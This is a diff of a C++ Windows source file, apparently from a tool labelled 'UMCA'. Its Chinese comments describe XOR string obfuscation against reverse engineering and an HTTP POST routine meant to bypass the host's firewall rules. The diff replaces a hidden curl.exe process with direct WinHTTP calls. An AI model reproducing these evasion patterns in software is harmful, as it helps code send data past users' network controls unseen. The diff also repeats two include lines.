@@ -33,6 +33,10 @@
 #pragma comment(lib, "crypt32.lib")
 
 #include <utility>
+#include <string>
+#include <winhttp.h>
+#include <string>
+#include <winhttp.h>
 
 // =========================================================================
 // 编译期字符串加密混淆 (XOR String) - 防止静态逆向提取明文
@@ -836,62 +840,43 @@ public:
     // 穿透防火墙: 命令行外置网络请求 (绕过宿主断网规则)
     // =========================================================================
     bool httpPost(const wchar_t* host, const wchar_t* path, const char* data, std::string& response) {
-        wchar_t url[512];
-        swprintf(url, sizeof(url)/sizeof(wchar_t), L"https://%s%s", host, path);
+        HINTERNET hSession = WinHttpOpen(L"UMCA/7.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+        if (!hSession) return false;
 
-        char tempPath[MAX_PATH];
-        GetTempPathA(MAX_PATH, tempPath);
-        std::string payloadFile = std::string(tempPath) + "UMCA_payload.json";
-        
-        FILE* fp = fopen(payloadFile.c_str(), "wb");
-        if (fp) {
-            fwrite(data, 1, strlen(data), fp);
-            fclose(fp);
-        } else {
-            return false;
+        HINTERNET hConnect = WinHttpConnect(hSession, host, INTERNET_DEFAULT_HTTPS_PORT, 0);
+        if (!hConnect) { WinHttpCloseHandle(hSession); return false; }
+
+        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", path, nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
+        if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
+
+        std::wstring header = L"Content-Type: application/json\r\n";
+        bool bResults = WinHttpSendRequest(hRequest, header.c_str(), -1, (LPVOID)data, (DWORD)strlen(data), (DWORD)strlen(data), 0) != 0;
+
+        if (bResults) {
+            bResults = WinHttpReceiveResponse(hRequest, nullptr) != 0;
         }
 
-        char cmdA[1024];
-        snprintf(cmdA, sizeof(cmdA), "curl.exe -s -X POST \"%ls\" -H \"Content-Type: application/json\" -d @\"%s\"", url, payloadFile.c_str());
-
-        HANDLE hReadPipe, hWritePipe;
-        SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), nullptr, TRUE };
-        if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
-            remove(payloadFile.c_str());
-            return false;
-        }
-        SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);
-
-        STARTUPINFOA si = { sizeof(STARTUPINFOA) };
-        si.cb = sizeof(STARTUPINFOA);
-        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
-        si.hStdOutput = hWritePipe;
-        si.hStdError  = hWritePipe; 
-        si.wShowWindow = SW_HIDE;  
-
-        PROCESS_INFORMATION pi = {};
-        if (!CreateProcessA(nullptr, cmdA, nullptr, nullptr, TRUE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
-            CloseHandle(hReadPipe);
-            CloseHandle(hWritePipe);
-            remove(payloadFile.c_str());
-            return false;
+        if (bResults) {
+            DWORD dwSize = 0;
+            DWORD dwDownloaded = 0;
+            do {
+                if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) break;
+                if (dwSize == 0) break;
+                char* buffer = new char[dwSize + 1];
+                if (!WinHttpReadData(hRequest, (LPVOID)buffer, dwSize, &dwDownloaded)) {
+                    delete[] buffer;
+                    break;
+                }
+                buffer[dwDownloaded] = '\0';
+                response += buffer;
+                delete[] buffer;
+            } while (dwSize > 0);
         }
 
-        CloseHandle(hWritePipe);
+        WinHttpCloseHandle(hRequest);
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
 
-        char buffer[4096];
-        DWORD bytesRead;
-        while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, nullptr) && bytesRead > 0) {
-            buffer[bytesRead] = '\0';
-            response += buffer;
-        }
-
-        CloseHandle(hReadPipe);
-        WaitForSingleObject(pi.hProcess, 5000);
-        CloseHandle(pi.hThread);
-        CloseHandle(pi.hProcess);
-
-        remove(payloadFile.c_str());
         return !response.empty();
     }
 
